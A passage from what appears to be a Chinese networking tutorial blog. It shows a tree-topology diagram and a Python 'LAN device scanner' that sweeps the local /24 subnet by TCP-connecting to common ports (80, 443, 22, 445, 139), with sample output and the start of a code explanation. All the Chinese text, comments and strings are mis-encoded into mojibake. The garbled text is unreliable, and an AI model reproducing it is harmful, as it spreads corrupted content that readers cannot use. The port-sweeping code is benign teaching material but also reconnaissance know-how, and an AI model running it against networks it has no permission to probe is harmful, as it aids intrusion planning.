åº”ç”¨ï¼šå†›äº‹ç½‘ç»œã€äº’è”ç½‘éª¨å¹²</li></ul><p><strong>ç±»æ¯”</strong>ï¼šåœ°é“ç½‘ç»œï¼Œæœ‰å¤šæ¡çº¿è·¯å¯é€‰</p><h3 id="5-æ ‘å‹æ‹“æ‰‘ï¼ˆTree-Topologyï¼‰">5. æ ‘å‹æ‹“æ‰‘ï¼ˆTree Topologyï¼‰</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     æ ¹äº¤æ¢æœº<br>     /      <span class="hljs-string">\</span><br>  äº¤æ¢æœºA   äº¤æ¢æœºB<br>  /   <span class="hljs-string">\</span>      /   <span class="hljs-string">\</span><br>è®¾å¤‡<span class="hljs-number">1</span> è®¾å¤‡<span class="hljs-number">2</span> è®¾å¤‡<span class="hljs-number">3</span> è®¾å¤‡<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li>âœ… ä¼˜ç‚¹ï¼šæ˜“äºæ‰©å±•ï¼Œå±‚æ¬¡æ¸…æ™°</li><li>âŒ ç¼ºç‚¹ï¼šæ ¹èŠ‚ç‚¹æ•…éšœå½±å“æ‰€æœ‰ä¸‹çº§</li><li>ğŸ“ åº”ç”¨ï¼šä¼ä¸šç½‘ç»œã€æ ¡å›­ç½‘</li></ul><p><strong>ç±»æ¯”</strong>ï¼šå…¬å¸ç»„ç»‡æ¶æ„</p><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šå±€åŸŸç½‘è®¾å¤‡æ‰«æå™¨">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šå±€åŸŸç½‘è®¾å¤‡æ‰«æå™¨</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ‰«æä½ æ‰€åœ¨å±€åŸŸç½‘å†…çš„æ‰€æœ‰è®¾å¤‡ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day02_lan_scanner.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šæ‰«æå±€åŸŸç½‘å†…çš„æ´»è·ƒè®¾å¤‡</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip_and_subnet</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–æœ¬æœºIPåœ°å€å’Œæ‰€åœ¨çš„å­ç½‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        local_ip: æœ¬æœºIPåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string">        subnet: å­ç½‘å­—ç¬¦ä¸²ï¼ˆå¦‚ &quot;192.168.1.0/24&quot;ï¼‰</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># åˆ›å»ºsocketè¿æ¥åˆ°å¤–éƒ¨åœ°å€ï¼Œè·å–æœ¬æœºIP</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>        local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br>        sock.close()<br><br>        <span class="hljs-comment"># ä»IPåœ°å€æ¨æ–­å­ç½‘ï¼ˆå‡è®¾æ˜¯/24å­ç½‘ï¼‰</span><br>        <span class="hljs-comment"># ä¾‹å¦‚ï¼š192.168.1.100 -&gt; 192.168.1.0/24</span><br>        ip_parts = local_ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        subnet = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">0</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">1</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">2</span>]&#125;</span>.0/24&quot;</span><br><br>        <span class="hljs-keyword">return</span> local_ip, subnet<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è·å–æœ¬æœºIPå¤±è´¥ï¼š<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_host</span>(<span class="hljs-params">ip, timeout=<span class="hljs-number">0.5</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ£€æŸ¥æŒ‡å®šIPçš„ä¸»æœºæ˜¯å¦åœ¨çº¿</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        ip: è¦æ£€æŸ¥çš„IPåœ°å€</span><br><span class="hljs-string">        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        å¦‚æœä¸»æœºåœ¨çº¿ï¼Œè¿”å›(ip, hostname)</span><br><span class="hljs-string">        å¦‚æœä¸»æœºä¸åœ¨çº¿ï¼Œè¿”å›None</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">        å°è¯•è¿æ¥åˆ°ç›®æ ‡IPçš„å¸¸ç”¨ç«¯å£ï¼ˆ80ç«¯å£ï¼‰</span><br><span class="hljs-string">        å¦‚æœèƒ½è¿æ¥ï¼Œè¯´æ˜ä¸»æœºåœ¨çº¿</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># å°è¯•è¿æ¥åˆ°80ç«¯å£ï¼ˆHTTPç«¯å£ï¼‰</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.settimeout(timeout)<br><br>        <span class="hljs-comment"># å°è¯•è¿æ¥</span><br>        result = sock.connect_ex((<span class="hljs-built_in">str</span>(ip), <span class="hljs-number">80</span>))<br><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># è¿æ¥æˆåŠŸï¼Œå°è¯•è·å–ä¸»æœºå</span><br>            <span class="hljs-keyword">try</span>:<br>                hostname = socket.gethostbyaddr(<span class="hljs-built_in">str</span>(ip))[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">except</span>:<br>                hostname = <span class="hljs-string">&quot;æœªçŸ¥ä¸»æœºå&quot;</span><br><br>            sock.close()<br>            <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(ip), hostname)<br>        <span class="hljs-keyword">else</span>:<br>            sock.close()<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping_check</span>(<span class="hljs-params">ip, timeout=<span class="hljs-number">0.5</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä½¿ç”¨æ›´ç®€å•çš„æ–¹æ³•æ£€æµ‹ä¸»æœºæ˜¯å¦åœ¨çº¿</span><br><span class="hljs-string">    å°è¯•å¤šä¸ªå¸¸ç”¨ç«¯å£</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    common_ports = [<span class="hljs-number">80</span>, <span class="hljs-number">443</span>, <span class="hljs-number">22</span>, <span class="hljs-number">445</span>, <span class="hljs-number">139</span>]  <span class="hljs-comment"># HTTP, HTTPS, SSH, SMB</span><br><br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> common_ports:<br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(timeout)<br>            result = sock.connect_ex((<span class="hljs-built_in">str</span>(ip), port))<br>            sock.close()<br><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># å°è¯•è·å–ä¸»æœºå</span><br>                <span class="hljs-keyword">try</span>:<br>                    hostname = socket.gethostbyaddr(<span class="hljs-built_in">str</span>(ip))[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">except</span>:<br>                    hostname = <span class="hljs-string">&quot;æœªçŸ¥ä¸»æœºå&quot;</span><br><br>                <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(ip), hostname, port)<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_network</span>(<span class="hljs-params">subnet, max_workers=<span class="hljs-number">50</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ‰«ææ•´ä¸ªå­ç½‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        subnet: å­ç½‘åœ°å€ï¼ˆå¦‚ &quot;192.168.1.0/24&quot;ï¼‰</span><br><span class="hljs-string">        max_workers: æœ€å¤§çº¿ç¨‹æ•°</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        æ´»è·ƒä¸»æœºåˆ—è¡¨</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è§£æå­ç½‘ï¼Œè·å–æ‰€æœ‰IPåœ°å€</span><br>    network = ipaddress.ip_network(subnet, strict=<span class="hljs-literal">False</span>)<br>    total_hosts = network.num_addresses - <span class="hljs-number">2</span>  <span class="hljs-comment"># å‡å»ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ” å¼€å§‹æ‰«æå­ç½‘: <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“Š æ€»å…±éœ€è¦æ‰«æ <span class="hljs-subst">&#123;total_hosts&#125;</span> ä¸ªIPåœ°å€&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;â³ è¯·ç¨å€™...\n&quot;</span>)<br><br>    active_hosts = []<br>    scanned = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æ‰«æ</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># æäº¤æ‰€æœ‰æ‰«æä»»åŠ¡</span><br>        future_to_ip = &#123;<br>            executor.submit(ping_check, ip): ip<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> network.hosts()  <span class="hljs-comment"># æ’é™¤ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€</span><br>        &#125;<br><br>        <span class="hljs-comment"># å¤„ç†å®Œæˆçš„ä»»åŠ¡</span><br>        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(future_to_ip):<br>            scanned += <span class="hljs-number">1</span><br>            result = future.result()<br><br>            <span class="hljs-keyword">if</span> result:<br>                ip, hostname, port = result<br>                active_hosts.append((ip, hostname, port))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… å‘ç°è®¾å¤‡: <span class="hljs-subst">&#123;ip:<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;hostname:<span class="hljs-number">30</span>&#125;</span> | ç«¯å£: <span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br><br>            <span class="hljs-comment"># æ˜¾ç¤ºè¿›åº¦</span><br>            <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>                progress = (scanned / total_hosts) * <span class="hljs-number">100</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   è¿›åº¦: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total_hosts&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> active_hosts<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">display_topology</span>(<span class="hljs-params">active_hosts, local_ip</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ˜¾ç¤ºç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼ˆç®€åŒ–ç‰ˆï¼‰</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼ˆæ˜Ÿå‹æ‹“æ‰‘ï¼‰&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;                      [è·¯ç”±å™¨/äº¤æ¢æœº]&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;                             |&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;          &quot;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">40</span>)<br><br>    <span class="hljs-keyword">for</span> ip, hostname, port <span class="hljs-keyword">in</span> active_hosts:<br>        marker = <span class="hljs-string">&quot; (æœ¬æœº)&quot;</span> <span class="hljs-keyword">if</span> ip == local_ip <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;          |-- [<span class="hljs-subst">&#123;ip&#125;</span>] <span class="hljs-subst">&#123;hostname&#125;</span><span class="hljs-subst">&#123;marker&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å±€åŸŸç½‘è®¾å¤‡æ‰«æå™¨&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è·å–æœ¬æœºIPå’Œå­ç½‘</span><br>    local_ip, subnet = get_local_ip_and_subnet()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> local_ip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ æ— æ³•è·å–æœ¬æœºIPåœ°å€ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥ï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“ æœ¬æœºIP: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸŒ æ‰€åœ¨å­ç½‘: <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># æ‰«æç½‘ç»œ</span><br>    active_hosts = scan_network(subnet)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ¨ æ‰«æå®Œæˆï¼å…±å‘ç° <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(active_hosts)&#125;</span> å°æ´»è·ƒè®¾å¤‡&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-comment"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> active_hosts:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ“‹ æ´»è·ƒè®¾å¤‡åˆ—è¡¨ï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IPåœ°å€&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;ä¸»æœºå&#x27;</span>:&lt;<span class="hljs-number">30</span>&#125;</span> | <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;å¼€æ”¾ç«¯å£&#x27;</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">for</span> ip, hostname, port <span class="hljs-keyword">in</span> active_hosts:<br>            marker = <span class="hljs-string">&quot; â­&quot;</span> <span class="hljs-keyword">if</span> ip == local_ip <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;hostname:&lt;<span class="hljs-number">30</span>&#125;</span> | <span class="hljs-subst">&#123;port&#125;</span><span class="hljs-subst">&#123;marker&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># æ˜¾ç¤ºæ‹“æ‰‘ç»“æ„</span><br>        display_topology(active_hosts, local_ip)<br><br>        <span class="hljs-comment"># åˆ†æç½‘ç»œç±»å‹</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ’¡ ç½‘ç»œåˆ†æï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - è¿™æ˜¯ä¸€ä¸ªå±€åŸŸç½‘ï¼ˆLANï¼‰&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - ä½¿ç”¨æ˜Ÿå‹æ‹“æ‰‘ç»“æ„&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   - å…±æœ‰ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(active_hosts)&#125;</span> å°è®¾å¤‡è¿æ¥åˆ°åŒä¸€ä¸ªäº¤æ¢æœº/è·¯ç”±å™¨&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nâš ï¸  æœªå‘ç°å…¶ä»–æ´»è·ƒè®¾å¤‡&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> code/day02<br>python day02_lan_scanner.py<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">======================================================================<br>                         å±€åŸŸç½‘è®¾å¤‡æ‰«æå™¨<br>======================================================================<br><br>ğŸ“ æœ¬æœºIP: 192.168.1.100<br>ğŸŒ æ‰€åœ¨å­ç½‘: 192.168.1.0/24<br><br>ğŸ” å¼€å§‹æ‰«æå­ç½‘: 192.168.1.0/24<br>ğŸ“Š æ€»å…±éœ€è¦æ‰«æ 254 ä¸ªIPåœ°å€<br>â³ è¯·ç¨å€™...<br><br>âœ… å‘ç°è®¾å¤‡: 192.168.1.1     | router.home                     | ç«¯å£: 80<br>âœ… å‘ç°è®¾å¤‡: 192.168.1.100   | linzhibin-MacBook              | ç«¯å£: 80<br>âœ… å‘ç°è®¾å¤‡: 192.168.1.105   | xiaomi-phone                   | ç«¯å£: 443<br><br>======================================================================<br>âœ¨ æ‰«æå®Œæˆï¼å…±å‘ç° 3 å°æ´»è·ƒè®¾å¤‡<br>======================================================================<br><br>ğŸ“‹ æ´»è·ƒè®¾å¤‡åˆ—è¡¨ï¼š<br><span class="hljs-section">IPåœ°å€           | ä¸»æœºå                          | å¼€æ”¾ç«¯å£</span><br><span class="hljs-section">----------------------------------------------------------------------</span><br>192.168.1.1     | router.home                    | 80<br>192.168.1.100   | linzhibin-MacBook              | 80 â­<br>192.168.1.105   | xiaomi-phone                   | 443<br><br>======================================================================<br>                    ç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼ˆæ˜Ÿå‹æ‹“æ‰‘ï¼‰<br>======================================================================<br><br><span class="hljs-code">                      [è·¯ç”±å™¨/äº¤æ¢æœº]</span><br><span class="hljs-code">                             |</span><br><span class="hljs-code">          ----------------------------------------</span><br><span class="hljs-code">          |-- [192.168.1.1] router.home</span><br><span class="hljs-code">          |-- [192.168.1.100] linzhibin-MacBook (æœ¬æœº)</span><br><span class="hljs-code">          |-- [192.168.1.105] xiaomi-phone</span><br><br>======================================================================<br><br>ğŸ’¡ ç½‘ç»œåˆ†æï¼š<br>   - è¿™æ˜¯ä¸€ä¸ªå±€åŸŸç½‘ï¼ˆLANï¼‰<br>   - ä½¿ç”¨æ˜Ÿå‹æ‹“æ‰‘ç»“æ„<br>   - å…±æœ‰ 3 å°è®¾å¤‡è¿æ¥åˆ°åŒä¸€ä¸ªäº¤æ¢æœº/è·¯ç”±å™¨<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="1-ipaddressæ¨¡å—">1. ipaddressæ¨¡å—</h3><p>Pythonçš„<code>ipaddress</code>æ¨¡å—ç”¨äºå¤„ç†IPåœ°å€å’Œç½‘ç»œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ipaddress<br><br><span class="hljs-comment"># åˆ›å»ºç½‘ç»œå¯¹è±¡</span><br>network = ipaddress.ip_network(<span class="hljs-string">&quot;192.168.1.0/24&quot;</span>)<br><br><span 